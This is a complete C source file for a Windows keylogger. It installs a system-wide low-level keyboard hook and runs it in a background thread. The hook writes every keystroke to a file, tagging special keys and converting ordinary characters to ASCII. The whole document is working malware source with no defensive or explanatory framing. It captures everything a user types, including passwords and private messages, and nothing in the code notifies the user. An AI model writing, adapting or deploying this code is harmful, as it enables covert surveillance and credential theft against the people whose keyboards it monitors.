#include <stdio.h>
#include <Windows.h>

#include "KeyLogger.h"


#define NUM_OF_LETTERS_TO_FLUSH     20

static HHOOK s_hook;
static FILE *s_fp = NULL;
static uint32_t s_running = 0;
static uint32_t s_num_of_letters = 0;

static void GetKeyFromVCode(uint32_t nVirtualKey);
static void KeyLoggerThread(char *filename);


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
uint32_t StartKeyLogger(char *filename)
{
    uint32_t status = 0;
    //create the monitor thread
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLoggerThread, filename, 0, 0);

    if (hThread == NULL)
    {
        printf("failed to start keylogger");
        status = 1;
    }
    return status;
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void StopKeyLogger()
{
    s_running = 0;
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
static LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if ((nCode >= 0) && (s_fp != NULL))
    {
        KBDLLHOOKSTRUCT kbdStruct; 

        // key down
        if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
        {
            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            // a key (non-system) is pressed.
            switch (kbdStruct.vkCode)
            {
            case 8:
                fprintf(s_fp, "[BS]");
                break;
            case 12: //CR
            case 13: //LF 
                fprintf(s_fp, "\n");
                break;
            case 27:
                fprintf(s_fp, "[ESC]");
                break;
            case 33:
                fprintf(s_fp, "[PU]");
                break;
            case 34:
                fprintf(s_fp, "[PD]");
                break;
            case 35:
                fprintf(s_fp, "[END]");
                break;
            case 36:
                fprintf(s_fp, "[HOME]");
                break;
            case 37:
                fprintf(s_fp, "[AL]");
                break;
            case 38:
                fprintf(s_fp, "[AU]");
                break;
            case 39:
                fprintf(s_fp, "[AR]");
                break;
            case 40:
                fprintf(s_fp, "[AD]");
                break;
            case 45:
                fprintf(s_fp, "[INS]");
                break;
            case 46:
                fprintf(s_fp, "[DEL]");
                break;
            case 91:
                fprintf(s_fp, "[LWK]");
                break;
            case 92:
                fprintf(s_fp, "[RWK]");
                break;
            case 93:
                fprintf(s_fp, "[R Menu]");
                break;
            case 144:
                fprintf(s_fp, "[LOCK]");
                break;
            default:
                GetKeyFromVCode(kbdStruct.vkCode);
                break;
            }
        }
    }
    // call the next hook in the hook chain. This is necessary or your hook chain will break and the hook stops
    return CallNextHookEx(s_hook, nCode, wParam, lParam);
}
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
static void GetKeyFromVCode(uint32_t nVirtualKey)
{
    uint16_t asciiKey;
    uint8_t lpKeyboard[256];
    GetKeyState(VK_CAPITAL);
    GetKeyState(VK_SCROLL);
    GetKeyState(VK_NUMLOCK);
    GetKeyboardState(lpKeyboard);

    if (ToAscii(nVirtualKey, MapVirtualKey(nVirtualKey, 0), lpKeyboard, &asciiKey, 0) == 1) 
    {
        s_num_of_letters++;
        fprintf(s_fp, "%c", asciiKey);
        
        if ((s_num_of_letters%NUM_OF_LETTERS_TO_FLUSH) == 0)
        {
            fflush(s_fp);
        }
    }
}
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
static void KeyLoggerThread(char *filename)
{
    MSG msg;
    uint32_t status = 1;

    //if we reach this point it seems that we are running 
    s_running = 1;

    if (!(s_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        printf("Failed to install hook!");
        return;
    }
    else
    {
        if (s_fp == NULL)
        {
            s_fp = fopen(filename, "a+");

            if (s_fp == NULL)
            {
                printf("Failed to open file %s", filename);
                return;
            }
        }

        //wait here till StopKeyLogger is called
        while ( GetMessage(&msg, NULL, 0, 0)  &&  (s_running == 1) )
        {
            //nothing to do here maricone
        }

        //finish all the stuff
        fflush(s_fp);
        fclose(s_fp);
        s_fp = NULL;
        UnhookWindowsHookEx(s_hook);
    }
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


